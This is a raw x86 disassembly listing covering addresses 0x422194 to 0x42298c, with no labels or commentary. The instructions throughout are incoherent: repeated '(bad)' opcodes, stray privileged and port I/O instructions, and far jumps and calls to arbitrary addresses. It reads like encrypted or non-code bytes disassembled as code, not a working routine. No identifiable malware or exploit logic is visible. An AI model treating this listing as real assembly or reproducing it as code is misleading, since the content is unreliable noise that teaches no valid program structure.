  422194:	ja     0x4221d7
  422196:	lock jne 0x42219a
  422199:	lock xor BYTE PTR [ebp-0x6b184fea],0x98
  4221a1:	add    BYTE PTR [eax],al
  4221a3:	int3   
  4221a4:	pop    edi
  4221a5:	pop    ss
  4221a6:	cld    
  4221a7:	mov    dl,0x9f
  4221a9:	(bad)  
  4221aa:	jmp    0x42214f
  4221ac:	fld    st(4)
  4221ae:	jg     0x4221d8
  4221b0:	add    al,0xd9
  4221b2:	clc    
  4221b3:	and    BYTE PTR [eax],al
  4221b5:	fld    st(5)
  4221b7:	or     DWORD PTR [esi],edi
  4221b9:	(bad)  
  4221bb:	or     edi,DWORD PTR [edx]
  4221bd:	stos   BYTE PTR es:[edi],al
  4221be:	addr16 out 0xb2,eax
  4221c1:	adc    eax,0x7c357afc
  4221c6:	retf   
  4221c7:	mov    dh,0x19
  4221c9:	mov    ebx,0x15e0f656
  4221ce:	call   0x737c4286
  4221d3:	mov    bh,0x22
  4221d5:	nop
  4221d6:	sub    ecx,ebx
  4221d8:	mov    DWORD PTR ss:[edi],edi
  4221db:	popf   
  4221dc:	mov    ds:0x5eee6fc3,al
  4221e1:	adc    BYTE PTR [eax+0x4a893db5],cl
  4221e7:	and    DWORD PTR [ebx+0x73c3],esp
  4221ed:	add    BYTE PTR [eax],al
  4221ef:	add    dh,bh
  4221f1:	data16 and al,0x86
  4221f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221f5:	mov    eax,ds:0x64094286
  4221fa:	ret    
  4221fb:	jnp    0x422271
  4221fd:	mov    al,ds:0x5b4eebc4
  422202:	add    dl,BYTE PTR [ebp+esi*1-0x11853f6e]
  422209:	out    0x13,al
  42220b:	xchg   BYTE PTR [ebp+0x1],ah
  42220e:	xchg   DWORD PTR [edx-0x1b],esi
  422211:	inc    ecx
  422212:	add    eax,0xa602e2eb
  422217:	sub    ecx,DWORD PTR [edi+0xd]
  42221a:	popf   
  42221b:	adc    eax,0x2c92c5fd
  422220:	cmp    ebx,DWORD PTR ds:0x7a5a158d
  422226:	mov    dl,0xc1
  422228:	mov    edx,0x84f7d30c
  42222d:	ret    0x88e6
  422230:	mov    ch,0x17
  422232:	scas   al,BYTE PTR es:[edi]
  422233:	stos   DWORD PTR es:[edi],eax
  422234:	cli    
  422235:	ds test eax,0xfaf59803
  42223b:	icebp  
  42223c:	push   edx
  42223d:	add    al,cl
  42223f:	or     ebx,DWORD PTR ds:0x81153e72
  422245:	or     ebx,ebx
  422247:	jg     0x4221f7
  422249:	mov    edi,0x7fcbbae6
  42224e:	push   ds
  42224f:	adc    eax,0x1499e95d
  422254:	add    BYTE PTR [eax],al
  422256:	add    BYTE PTR [eax],al
  422258:	add    BYTE PTR [edi+0x5ac3f8ee],al
  42225e:	or     al,0x93
  422260:	repz push ecx
  422262:	xchg   ebp,eax
  422263:	loop   0x422279
  422265:	(bad)  
  422266:	cli    
  422267:	or     eax,0xa93e12ef
  42226c:	add    esi,esp
  42226e:	inc    ebp
  42226f:	jmp    0xfd41:0x1fa7d0b4
  422276:	mov    ecx,0xb4c7b086
  42227b:	jno    0x422210
  42227d:	ret    0x71b3
  422280:	fwait
  422281:	scas   al,BYTE PTR es:[edi]
  422282:	dec    ebp
  422283:	pop    esi
  422284:	inc    edi
  422285:	mov    ch,0x2
  422287:	xor    al,0x1
  422289:	adc    dl,bh
  42228b:	mov    edi,0xd8ee6714
  422290:	ret    
  422291:	repnz mov bl,0xff
  422294:	push   ds
  422295:	cld    
  422296:	mov    fs,WORD PTR [ebx]
  422298:	int    0x10
  42229a:	push   cs
  42229b:	adc    bl,BYTE PTR ds:0x71ffc22d
  4222a1:	mov    es,WORD PTR [edx+0x9f5e5c3]
  4222a7:	cld    
  4222a8:	adc    eax,0xdcfcaffc
  4222ad:	mov    esi,0x5ee93ff0
  4222b2:	loopne 0x42229c
  4222b4:	jbe    0x422237
  4222b6:	xor    bh,0x6e
  4222b9:	repz icebp 
  4222bb:	imul   esi,ecx,0x0
  4222c1:	add    dh,cl
  4222c3:	jp     0x4222ac
  4222c5:	pop    esi
  4222c6:	imul   edi,edx,0x7e9b56d7
  4222cc:	retf   
  4222cd:	stos   BYTE PTR es:[edi],al
  4222ce:	jbe    0x422283
  4222d0:	push   esi
  4222d1:	push   edx
  4222d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222d3:	mov    ds:0x27671bf,eax
  4222d8:	add    dl,ch
  4222da:	imul   esp,DWORD PTR [esi-0x35],0xffffffaa
  4222de:	jbe    0x4222ab
  4222e0:	fcomp  QWORD PTR [ecx+ecx*2-0x47aa885]
  4222e7:	cdq    
  4222e8:	push   edi
  4222e9:	push   ss
  4222ea:	cmp    BYTE PTR [edx],ah
  4222ec:	out    dx,eax
  4222ed:	imul   esi,DWORD PTR [esi+0x2],0x2208d96a
  4222f4:	fisubr DWORD PTR [eax+0x76]
  4222f7:	add    ch,cl
  4222f9:	loopne 0x422372
  4222fb:	stos   BYTE PTR es:[edi],al
  4222fc:	pop    edi
  4222fd:	out    dx,al
  4222fe:	das    
  4222ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422300:	xor    dl,al
  422302:	xor    dh,BYTE PTR [ebp-0xbdd0b04]
  422308:	aas    
  422309:	jmp    0x629ccad5
  42230e:	mov    edx,0x800c1aa
  422313:	push   es
  422314:	dec    edi
  422315:	push   esi
  422316:	addr16 out dx,al
  422318:	jl     0x422398
  42231a:	xor    dh,bh
  42231c:	xchg   cl,bl
  42231e:	test   al,0x1f
  422320:	xchg   DWORD PTR [esi-0x7c],eax
  422323:	cmp    esp,edx
  422325:	ja     0x422327
  422327:	add    BYTE PTR [eax],al
  422329:	add    BYTE PTR [eax],al
  42232b:	fld    TBYTE PTR [eax]
  42232d:	mov    edi,0xe7669a89
  422332:	push   es
  422333:	mov    bh,0xdd
  422335:	jg     0x42239d
  422337:	fs (bad) 
  422339:	addr16 mov al,ah
  42233c:	inc    ecx
  42233d:	cld    
  42233e:	dec    cl
  422340:	sbb    DWORD PTR [esi],ecx
  422342:	inc    eax
  422343:	mov    eax,gs
  422345:	push   di
  422347:	rol    DWORD PTR [esi+0x4c9c43c8],cl
  42234d:	sti    
  42234e:	adc    eax,0x3c0f80
  422353:	pop    ss
  422354:	ins    BYTE PTR es:[edi],dx
  422355:	cmp    edx,DWORD PTR fs:[edx+0x5]
  422359:	inc    edx
  42235a:	repz or dh,ah
  42235d:	jo     0x422383
  42235f:	inc    esp
  422360:	mov    BYTE PTR [eax+0x24],dh
  422363:	inc    esp
  422364:	dec    ebx
  422365:	sti    
  422366:	adc    eax,0x3fc8f8
  42236b:	(bad)  
  42236c:	(bad)  
  42236d:	jg     0x422333
  42236f:	push   eax
  422370:	xor    bh,0xff
  422373:	call   0x1a4176ae
  422378:	sbb    eax,0xed1c400e
  42237d:	popa   
  42237e:	jmp    0x6a13:0xf87ff423
  422385:	punpckhdq mm4,QWORD PTR [ebp*2-0xbcc1774]
  42238d:	pop    es
  42238e:	fadd   DWORD PTR [eax]
  422390:	add    BYTE PTR [eax],al
  422392:	add    BYTE PTR [eax],al
  422394:	jne    0x4223c6
  422396:	test   DWORD PTR [ebx+0x5703dc31],0x6701349c
  4223a0:	mov    ch,0x92
  4223a2:	add    BYTE PTR [eax],al
  4223a4:	jne    0x4223c2
  4223a6:	pop    es
  4223a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223a8:	mov    cl,0xdb
  4223aa:	add    esp,DWORD PTR [edi]
  4223ac:	cmp    eax,0x68fcb8f3
  4223b1:	pop    es
  4223b2:	repnz aas 
  4223b4:	jne    0x422386
  4223b6:	mov    cl,0x88
  4223b8:	mov    dh,0xd3
  4223ba:	inc    ebp
  4223bb:	pop    es
  4223bc:	jne    0x4223a4
  4223be:	jl     0x4223ab
  4223c0:	idiv   BYTE PTR [esi+0x8]
  4223c3:	jle    0x42235e
  4223c5:	xchg   esi,eax
  4223c6:	add    BYTE PTR [eax],al
  4223c8:	jne    0x4223b6
  4223ca:	aam    0xd8
  4223cc:	inc    ebx
  4223cd:	dec    eax
  4223ce:	enter  0xbf1a,0xd3
  4223d2:	(bad)  
  4223d5:	xchg   edi,eax
  4223d6:	push   edx
  4223d7:	inc    DWORD PTR [edx-0x70c5e7e6]
  4223dd:	sbb    al,BYTE PTR [eax]
  4223df:	test   BYTE PTR ds:0x75a28419,dh
  4223e5:	sbb    DWORD PTR [eax],eax
  4223e7:	aaa    
  4223e8:	shl    BYTE PTR ds:0x19f98401,0x0
  4223ef:	add    BYTE PTR [esi+eax*2-0x7304f310],cl
  4223f6:	add    BYTE PTR [eax],al
  4223f8:	add    BYTE PTR [eax],al
  4223fa:	add    BYTE PTR [eax],al
  4223fc:	add    BYTE PTR [ebp-0x5c],dh
  4223ff:	xchg   edi,eax
  422400:	pop    es
  422401:	mov    ds:0x32f3b6f1,eax
  422406:	or     DWORD PTR [ebp-0x7d6a8541],eax
  42240c:	jmp    DWORD PTR [edx]
  42240e:	sbb    dl,BYTE PTR [ecx-0x79]
  422411:	sub    DWORD PTR [ebx],eax
  422413:	sub    al,BYTE PTR [eax+ebp*4]
  422416:	pop    es
  422417:	repz jmp 0x42247e
  42241a:	ret    0x1be6
  42241d:	xor    ebx,DWORD PTR [edx]
  42241f:	int    0x11
  422421:	in     eax,dx
  422422:	adc    ch,BYTE PTR [edi-0x68]
  422425:	xchg   esi,eax
  422426:	jmp    0x9b15:0x8ee91269
  42242d:	call   0x75460aac
  422432:	add    ebx,esp
  422434:	addr16 mov esi,0x28cae6c3
  42243a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42243b:	sbb    al,0x0
  42243d:	ror    BYTE PTR [ebp+0x1ab07cde],0x2c
  422444:	adc    dh,BYTE PTR [ecx+0x63ad9107]
  42244a:	test   al,0xfe
  42244c:	cdq    
  42244d:	test   BYTE PTR [ebx+0x1b],bh
  422450:	hlt    
  422451:	cdq    
  422452:	(bad)  
  422453:	bnd jl 0x42240e
  422456:	pop    es
  422457:	sar    ebx,cl
  422459:	xchg   edx,eax
  42245a:	aas    
  42245b:	push   esp
  42245c:	adc    DWORD PTR [ecx+0x10a21b],eax
  422462:	add    BYTE PTR [eax],al
  422464:	add    BYTE PTR [eax],al
  422466:	pop    es
  422467:	bnd jae 0x42241a
  42246a:	xchg   esi,eax
  42246b:	mov    dh,0x3d
  42246d:	xchg   edi,eax
  42246e:	jle    0x422477
  422470:	mov    ebx,0x3d115afb
  422475:	adc    DWORD PTR [ecx+0x79],ebx
  422478:	stos   BYTE PTR es:[edi],al
  422479:	out    0x6e,eax
  42247b:	sbb    DWORD PTR [esi],0x11
  42247e:	(bad)  
  42247f:	shl    BYTE PTR [ecx-0x38],cl
  422482:	xchg   esi,eax
  422483:	jmp    0x7d05:0x74c01fe
  42248a:	xor    eax,0x29b2571a
  42248f:	pop    es
  422490:	call   FWORD PTR [ebp-0x24e40b7b]
  422496:	ss pop es
  422498:	std    
  422499:	pop    esp
  42249a:	or     DWORD PTR [esi],eax
  42249c:	jb     0x42248b
  42249e:	gs xchg esp,eax
  4224a0:	pop    es
  4224a1:	(bad)  
  4224a2:	or     edx,DWORD PTR [ebx-0x7e8ed535]
  4224a8:	ret    
  4224a9:	cmc    
  4224aa:	and    eax,0x937258a5
  4224af:	lods   al,BYTE PTR ds:[esi]
  4224b0:	shl    BYTE PTR [esi-0x6dcf0154],0xaf
  4224b7:	stos   BYTE PTR es:[edi],al
  4224b8:	and    esi,DWORD PTR ds:0xeb417e74
  4224be:	jbe    0x4224c2
  4224c0:	mov    ebp,DWORD PTR ds:0x814fbecd
  4224c6:	push   ebx
  4224c7:	mov    eax,0x86fc
  4224cc:	add    BYTE PTR [eax],al
  4224ce:	add    BYTE PTR [edi],ch
  4224d0:	ret    
  4224d1:	and    ecx,ecx
  4224d3:	dec    esi
  4224d4:	or     BYTE PTR [eax-0x36],dh
  4224d7:	and    eax,ebx
  4224d9:	and    esp,DWORD PTR [ecx]
  4224db:	jns    0x42249b
  4224dd:	pop    ebp
  4224de:	data16 gs scas al,BYTE PTR es:[edi]
  4224e1:	cld    
  4224e2:	hlt    
  4224e3:	call   0xa09e:0xc9e93ff0
  4224ea:	inc    ecx
  4224eb:	gs push es
  4224ed:	cld    
  4224ee:	fdiv   st(2),st
  4224f0:	cmp    DWORD PTR [eax-0x17],eax
  4224f3:	pop    ds
  4224f4:	lods   eax,DWORD PTR ds:[esi]
  4224f5:	and    BYTE PTR [ecx],0x85
  4224f8:	sbb    dh,BYTE PTR [edx+0x17e20a60]
  4224fe:	jo     0x422522
  422500:	loop   0x422515
  422502:	push   ecx
  422503:	jo     0x4224fc
  422505:	add    DWORD PTR [ebx+0x62000277],0xffffff84
  42250c:	sbb    eax,0xf28500ae
  422511:	sti    
  422512:	mov    edx,DWORD PTR [esp+edi*2-0x29]
  422516:	seto   BYTE PTR [ebp+0x7f0cfffc]
  42251d:	mov    eax,0xfffea024
  422522:	call   FWORD PTR ds:0xc938105
  422528:	add    al,BYTE PTR [eax]
  42252a:	mov    ebx,DWORD PTR [eax-0x23ff83e6]
  422530:	add    DWORD PTR [edi+0x79],edi
  422533:	add    BYTE PTR [eax],al
  422535:	add    BYTE PTR [eax],al
  422537:	add    al,dl
  422539:	add    DWORD PTR [ebx],ecx
  42253b:	test   BYTE PTR [esi-0x2],cl
  42253e:	(bad)  
  42253f:	(bad)  
  422540:	cmp    DWORD PTR [edx],edi
  422542:	and    BYTE PTR [eax+0x49],cl
  422545:	jb     0x422567
  422547:	and    al,0xe4
  422549:	retf   0xff5c
  42254c:	jmp    0x422543
  42254e:	mov    al,0x24
  422550:	dec    esp
  422551:	(bad)  
  422552:	(bad)  
  422553:	jmp    DWORD PTR [edx+edi*1]
  422556:	and    BYTE PTR [edi],dl
  422558:	daa    
  422559:	jp     0x42257b
  42255b:	mov    BYTE PTR [ecx+eax*1+0x57b7e800],cl
  422562:	sti    
  422563:	call   FWORD PTR [edx+esi*2]
  422566:	and    BYTE PTR [ebx],dl
  422568:	pushf  
  422569:	add    al,0x80
  42256b:	or     ecx,DWORD PTR [ebp+0x2b6a0001]
  422571:	cmc    
  422572:	jo     0x422598
  422574:	jo     0x42256a
  422576:	adc    DWORD PTR [edi+ecx*2],ebx
  422579:	inc    ecx
  42257a:	cld    
  42257b:	(bad)  
  42257c:	and    BYTE PTR ds:0x770be824,bl
  422582:	cld    
  422583:	call   FWORD PTR [ebx+0x6b30206a]
  422589:	or     eax,DWORD PTR [eax]
  42258b:	adc    esi,DWORD PTR [ebp+0x5b]
  42258e:	add    BYTE PTR [ecx-0x7d23c047],cl
  422594:	xor    cl,BYTE PTR [esp+eax*4]
  422597:	fbstp  TBYTE PTR [ebp+0x1b]
  42259a:	add    BYTE PTR [ebx+0x0],cl
  4225a0:	add    BYTE PTR [ecx-0x101847c9],bh
  4225a6:	jne    0x4225b5
  4225a8:	cld    
  4225a9:	dec    ch
  4225ab:	xrelease mov BYTE PTR [ecx-0x493a1001],dh
  4225b2:	pop    ds
  4225b3:	add    BYTE PTR [edi+0x42237e],al
  4225b9:	je     0x4225d3
  4225bb:	inc    ebx
  4225bc:	xchg   BYTE PTR [ebx],dh
  4225be:	mov    bl,0x45
  4225c0:	inc    ebp
  4225c1:	push   ecx
  4225c2:	sbb    bl,BYTE PTR [ebx]
  4225c4:	lahf   
  4225c5:	fist   DWORD PTR [ebx+0xd]
  4225c8:	cld    
  4225c9:	dec    eax
  4225ca:	or     ecx,DWORD PTR ds:0x64737972
  4225d0:	jge    0x422647
  4225d2:	sbb    edi,DWORD PTR [ebx+0x43]
  4225d5:	xchg   ecx,eax
  4225d6:	adc    eax,DWORD PTR [edi+0xd2328bf]
  4225dc:	mov    bl,0x51
  4225de:	fwait
  4225df:	add    BYTE PTR [eax],al
  4225e1:	jne    0x422583
  4225e3:	test   BYTE PTR [ebx],ah
  4225e5:	in     eax,dx
  4225e6:	sbb    al,BYTE PTR [eax]
  4225e8:	add    BYTE PTR [ebp-0x7503508d],bl
  4225ee:	mov    cl,0x7f
  4225f0:	inc    DWORD PTR [edx+0x7500421a]
  4225f6:	mov    ah,0x94
  4225f8:	and    eax,ebp
  4225fa:	nop
  4225fb:	les    esp,FWORD PTR [ebx]
  4225fd:	int    0xb1
  4225ff:	add    BYTE PTR [esi+0x75],ah
  422602:	sbb    DWORD PTR [ebx+0x40],edi
  422605:	add    BYTE PTR [eax],al
  422607:	add    BYTE PTR [eax],al
  422609:	add    BYTE PTR [ebp-0x60],ch
  42260c:	test   BYTE PTR [ebx],ah
  42260e:	cmc    
  42260f:	add    ah,bh
  422611:	add    esi,DWORD PTR [ebp+0x79]
  422614:	test   eax,0xca7eedff
  422619:	xchg   DWORD PTR [edx],edi
  42261b:	add    al,0xe6
  42261d:	cdq    
  42261e:	push   esp
  42261f:	jns    0x4225ca
  422621:	repz inc DWORD PTR [esi+0x1acacbc2]
  422628:	icebp  
  422629:	add    DWORD PTR [ebp+0x2],esi
  42262c:	and    edx,0xdc0a86ff
  422632:	mov    ds:0x7501cd1a,al
  422637:	add    ah,BYTE PTR [edx+0x45]
  42263a:	stos   BYTE PTR es:[edi],al
  42263b:	jne    0x42265f
  42263d:	call   0x9807d8ec
  422642:	jp     0x422647
  422644:	xor    ch,al
  422646:	xchg   esi,eax
  422647:	sbb    ch,BYTE PTR [esi+ecx*8-0x18bffc27]
  42264e:	std    
  42264f:	sub    dh,BYTE PTR [ebx-0x70]
  422652:	xchg   esi,eax
  422653:	jmp    0x3e6:0xffaf1c3e
  42265a:	in     al,dx
  42265b:	cmp    esi,DWORD PTR [esi]
  42265d:	mov    cl,0xb1
  42265f:	mov    cs,edx
  422661:	jecxz  0x4225f5
  422663:	clc    
  422664:	mov    esp,0xcd98a10c
  422669:	js     0x42262d
  42266b:	jne    0x422657
  42266d:	out    0x0,eax
  42266f:	add    BYTE PTR [eax],al
  422671:	add    BYTE PTR [eax],al
  422673:	dec    edx
  422674:	stos   BYTE PTR es:[edi],al
  422675:	dec    esi
  422676:	push   edx
  422677:	jne    0x42267b
  422679:	out    0x78,eax
  42267b:	mov    ecx,0x60cb9b2
  422680:	fiadd  WORD PTR [esi]
  422682:	sbb    al,0x61
  422684:	lds    eax,FWORD PTR [ebp+0xd]
  422687:	repz mov ebp,0xbe68f802
  42268d:	dec    DWORD PTR [ecx+edx*2]
  422690:	push   DWORD PTR [ebx-0x6a]
  422693:	int    0x87
  422695:	and    eax,DWORD PTR [ecx]
  422697:	repnz add eax,0x88bdf172
  42269d:	or     esp,DWORD PTR [edx+0xa]
  4226a0:	repz call 0x23e9d48b
  4226a6:	(bad)  [ebx-0x191edc41]
  4226ac:	add    eax,0x7a02cd73
  4226b1:	shr    dh,0xea
  4226b4:	fidiv  WORD PTR [ebx+0x3e]
  4226b7:	imul   edx,DWORD PTR [ebx],0x671deef
  4226bd:	jae    0x4226cc
  4226bf:	aad    0x7b
  4226c1:	inc    ebx
  4226c2:	add    eax,0x444b1ae1
  4226c7:	jno    0x4226cb
  4226c9:	cmp    DWORD PTR ds:0x3bffeecd,0xdd7ac9d8
  4226d3:	jmp    0x0:0x2586b8
  4226da:	add    BYTE PTR [eax],al
  4226dc:	fucomp st(2)
  4226de:	xchg   BYTE PTR ds:0xe2e8eecd,bh
  4226e4:	lods   eax,DWORD PTR ds:[esi]
  4226e5:	xchg   DWORD PTR [ebx],ecx
  4226e7:	adc    eax,0xd2e7ad7b
  4226ec:	sti    
  4226ed:	add    bh,ah
  4226ef:	jb     0x4226e3
  4226f1:	ficom  WORD PTR [edi]
  4226f3:	ins    BYTE PTR es:[edi],dx
  4226f4:	imul   ecx,DWORD PTR [edi-0x2145a3d6],0xa6b25147
  4226fe:	cld    
  4226ff:	pop    esi
  422700:	std    
  422701:	mov    esi,0x9cf5f523
  422706:	pop    edi
  422707:	jmp    0xaa6efb
  42270c:	out    0xc9,eax
  42270e:	pop    ds
  42270f:	adc    al,0xe5
  422711:	(bad)  
  422712:	push   edi
  422713:	mov    ecx,DWORD PTR [ecx]
  422715:	test   ch,0x46
  422718:	adc    BYTE PTR [esi],al
  42271a:	cmp    DWORD PTR [esi+0x34],0x7d
  42271e:	inc    ebp
  42271f:	fs gs (bad) 
  422722:	idiv   bh
  422724:	arpl   WORD PTR [eax+0x1dd4243f],ax
  42272a:	adc    al,0x5c
  42272c:	jae    0x42273c
  42272e:	mov    BYTE PTR [eax+edi*1-0xe],al
  422732:	mov    BYTE PTR [ebp+0x3c],cl
  422735:	add    edi,DWORD PTR [ebx-0x3a622577]
  42273b:	inc    esi
  42273c:	mov    al,ds:0x37e306
  422741:	add    BYTE PTR [eax],al
  422743:	add    BYTE PTR [eax],al
  422745:	and    DWORD PTR [esi],ecx
  422747:	cld    
  422748:	push   ebp
  422749:	xchg   edi,eax
  42274a:	sbb    bh,BYTE PTR [ebx+0x3d]
  42274d:	push   ss
  42274e:	inc    edx
  42274f:	inc    eax
  422750:	add    ah,bl
  422752:	mov    eax,0xb3e45d88
  422757:	push   esp
  422758:	je     0x4226f7
  42275a:	frndint 
  42275c:	cmp    eax,DWORD PTR [ebx]
  42275e:	xchg   ebx,eax
  42275f:	push   0x7dfa9139
  422764:	data16 in al,0x24
  422767:	in     eax,0x0
  422769:	int3   
  42276a:	cmp    DWORD PTR [ebx-0x7c619e8c],0xfd065fcc
  422774:	adc    eax,0x3bf794
  422779:	in     eax,0x8a
  42277b:	pop    es
  42277c:	jle    0x4227dc
  42277e:	adc    al,0x3f
  422780:	sti    
  422781:	cwde   
  422782:	push   es
  422783:	je     0x4227ba
  422785:	pop    es
  422786:	sar    al,cl
  422788:	call   0xfc60a402
  42278d:	jb     0x4227fb
  42278f:	or     al,0xfc
  422791:	loope  0x4227a6
  422793:	popf   
  422794:	mov    edi,0xffffeaed
  422799:	jbe    0x422789
  42279b:	pop    ebx
  42279c:	retf   
  42279d:	mov    dh,0xeb
  42279f:	xor    BYTE PTR [edi-0x3f],0xeb
  4227a3:	nop
  4227a4:	cmp    esi,ebp
  4227a6:	mov    ds:0xff88,al
  4227ab:	add    BYTE PTR [eax],al
  4227ad:	add    cl,al
  4227af:	loope  0x42282b
  4227b1:	(bad)  
  4227b2:	sbb    eax,0x2afc1f61
  4227b7:	outs   dx,BYTE PTR ds:[esi]
  4227b8:	inc    esp
  4227b9:	jae    0x422833
  4227bb:	stc    
  4227bc:	(bad)  
  4227bd:	(bad)  
  4227be:	mov    eax,ds:0x9038bed1
  4227c3:	fild   WORD PTR [ebx+0x33739dbd]
  4227c9:	inc    eax
  4227ca:	jne    0x4227ac
  4227cc:	lock sbb esp,DWORD PTR [edi+0x2b]
  4227d0:	add    al,0xfd
  4227d2:	push   0x797206fb
  4227d7:	sbb    al,0x7
  4227d9:	adc    ah,BYTE PTR [ecx-0x51]
  4227dc:	ret    0xf7ff
  4227df:	scas   al,BYTE PTR es:[edi]
  4227e0:	repz pop esp
  4227e2:	xor    edx,DWORD PTR [ecx+ebp*4]
  4227e5:	rcr    BYTE PTR [ebp+0x73],0x33
  4227e9:	inc    eax
  4227ea:	jne    0x42278c
  4227ec:	lock sbb esp,DWORD PTR [edi+0x2b]
  4227f0:	add    al,0x31
  4227f2:	mov    ch,0x2a
  4227f4:	sahf   
  4227f5:	xchg   BYTE PTR [ecx],dh
  4227f7:	test   BYTE PTR [ecx],al
  4227f9:	mov    DWORD PTR [edx-0x387de46d],edi
  4227ff:	inc    al
  422801:	mov    DWORD PTR [edi+0x67],edi
  422804:	cmp    al,0x73
  422806:	dec    edx
  422807:	add    dl,BYTE PTR [esi]
  422809:	inc    esp
  42280a:	add    bh,bl
  42280c:	or     al,0x91
  42280e:	ja     0x42287c
  422810:	out    0xab,eax
  422812:	add    BYTE PTR [eax],al
  422814:	add    BYTE PTR [eax],al
  422816:	add    BYTE PTR [ebp+0x6],bl
  422819:	imul   ecx,DWORD PTR [ebx*4-0x373a178b],0x6a1e3333
  422824:	xor    BYTE PTR [eax],0xcc
  422827:	rcl    DWORD PTR [esi+edi*4],1
  42282a:	adc    DWORD PTR [edi+ecx*1+0x63],edi
  42282e:	cmp    al,0xef
  422830:	jbe    0x42281d
  422832:	xor    esi,DWORD PTR [esp+ecx*4+0x332b83df]
  422839:	mov    WORD PTR [esi+esi*8],ds
  42283c:	leave  
  42283d:	jge    0x422845
  42283f:	hlt    
  422840:	retf   0x5be8
  422843:	je     0x4228bb
  422845:	out    0x12,eax
  422847:	xor    BYTE PTR [edx-0x7bca564e],cl
  42284d:	or     al,BYTE PTR [edi+ecx*4]
  422850:	or     al,BYTE PTR [ecx+0x45]
  422853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422854:	mov    eax,ebp
  422856:	sbb    esi,0x62
  422859:	in     eax,0x3
  42285b:	jne    0x4228b0
  42285d:	outs   dx,BYTE PTR ds:[esi]
  42285e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42285f:	jp     0x4228b9
  422861:	adc    bl,BYTE PTR [esi+edi*1+0x24042979]
  422868:	lea    esp,[eax+eiz*2-0x33]
  42286c:	jmp    DWORD PTR [edx-0x6e0e124c]
  422872:	mov    edi,edi
  422874:	call   DWORD PTR [edx-0x1e8a0d81]
  42287a:	popf   
  42287b:	add    BYTE PTR [eax],al
  42287d:	add    BYTE PTR [eax],al
  42287f:	add    BYTE PTR [ebp+0x5a],dh
  422882:	nop
  422883:	scas   eax,DWORD PTR es:[edi]
  422884:	mov    ds:0xf776e9ff,eax
  422889:	scas   al,BYTE PTR es:[edi]
  42288a:	add    BYTE PTR [esp+edi*2-0x2],dh
  42288e:	push   eax
  42288f:	pop    esp
  422890:	or     ah,BYTE PTR [ebx+0x4f6c66f7]
  422896:	sti    
  422897:	hlt    
  422898:	xchg   BYTE PTR [ecx],dl
  42289a:	inc    eax
  42289b:	jmp    0x6a4a6d8f
  4228a0:	jns    0x4228a0
  4228a2:	jne    0x422891
  4228a4:	add    BYTE PTR [ebx],al
  4228a6:	out    0x23,eax
  4228a8:	inc    eax
  4228a9:	dec    BYTE PTR [ebp-0x4035e94]
  4228af:	imul   edx,DWORD PTR cs:[ecx-0x29],0xc08676e9
  4228b7:	out    dx,al
  4228b8:	mov    ebx,0x76e900d4
  4228bd:	mov    DWORD PTR [edx],ecx
  4228bf:	bound  esi,QWORD PTR [esi-0x75]
  4228c2:	xchg   ebp,eax
  4228c3:	push   ebp
  4228c4:	jp     0x4228c4
  4228c6:	sti    
  4228c7:	fwait
  4228c8:	loope  0x4228c7
  4228ca:	push   eax
  4228cb:	in     eax,dx
  4228cc:	xchg   ebx,eax
  4228cd:	mov    edi,0xf6f1e174
  4228d2:	add    eax,edx
  4228d4:	scas   al,BYTE PTR es:[edi]
  4228d5:	(bad)  
  4228d6:	sti    
  4228d7:	jmp    0xd4eead40
  4228dc:	jge    0x4228dc
  4228de:	adc    dh,bl
  4228e0:	push   0xffffff83
  4228e2:	add    cl,ch
  4228e4:	add    BYTE PTR [eax],al
  4228e6:	add    BYTE PTR [eax],al
  4228e8:	add    BYTE PTR [esi-0x8],dh
  4228eb:	inc    edx
  4228ec:	icebp  
  4228ed:	jo     0x422965
  4228ef:	pop    ds
  4228f0:	fs push ebx
  4228f2:	xlat   BYTE PTR ds:[ebx]
  4228f3:	std    
  4228f4:	scas   al,BYTE PTR es:[edi]
  4228f5:	jge    0x422946
  4228f7:	call   0x449f90
  4228fc:	gs ss jae 0x42290f
  422900:	bound  ebp,QWORD PTR [ecx+ecx*4-0x54e4a3ff]
  422907:	std    
  422908:	add    bl,bh
  42290a:	or     DWORD PTR [ecx+0x53],edx
  42290d:	sbb    esi,DWORD PTR [ebx-0x70237afd]
  422913:	shl    esi,0x52
  422916:	(bad)  
  422917:	cli    
  422918:	jae    0x4228b4
  42291a:	ja     0x42299a
  42291c:	fcomp  DWORD PTR [ecx]
  42291e:	or     bh,ah
  422920:	push   eax
  422921:	das    
  422922:	jne    0x4229a2
  422924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422925:	(bad)  
  422926:	or     bh,ah
  422928:	push   eax
  422929:	les    esi,FWORD PTR [edi+esi*4]
  42292c:	call   FWORD PTR [ebx+0x6175bb7c]
  422932:	mov    al,ds:0xebb75f00
  422937:	xchg   BYTE PTR [ebp-0x3f150],al
  42293d:	cld    
  42293e:	jle    0x42290d
  422940:	call   0x3e346b
  422945:	xchg   edi,eax
  422946:	or     DWORD PTR [esi-0x1],edi
  422949:	mov    al,ds:0xff80b4
  42294e:	add    BYTE PTR [eax],al
  422950:	add    BYTE PTR [eax],al
  422952:	or     eax,0xb83668e
  422957:	pop    es
  422958:	je     0x4229c2
  42295a:	xchg   edi,eax
  42295b:	sti    
  42295c:	mov    BYTE PTR [ecx],al
  42295e:	inc    ebx
  42295f:	jnp    0x4228ef
  422961:	lods   al,BYTE PTR ds:[esi]
  422962:	sbb    DWORD PTR [esi],eax
  422964:	cld    
  422965:	push   edx
  422966:	scas   eax,DWORD PTR es:[edi]
  422967:	add    eax,0xe5f0c4b
  42296c:	add    BYTE PTR [esp+ebx*2+0x1f],dh
  422970:	call   FWORD PTR fs:[ebx]
  422973:	push   es
  422974:	cmc    
  422975:	inc    esi
  422976:	aam    0xfd
  422978:	outs   dx,DWORD PTR ds:[esi]
  422979:	and    ebp,DWORD PTR [ecx]
  42297b:	adc    ebx,0xfffffffd
  42297e:	sbb    eax,DWORD PTR [esi]
  422980:	dec    ebx
  422981:	call   0x422feb
  422986:	jne    0x4229f7
  422988:	inc    esp
  422989:	jae    0x422911
  42298b:	pusha  
  42298c:	repnz mov BYTE PTR [esi+esi*2+0x71],dh
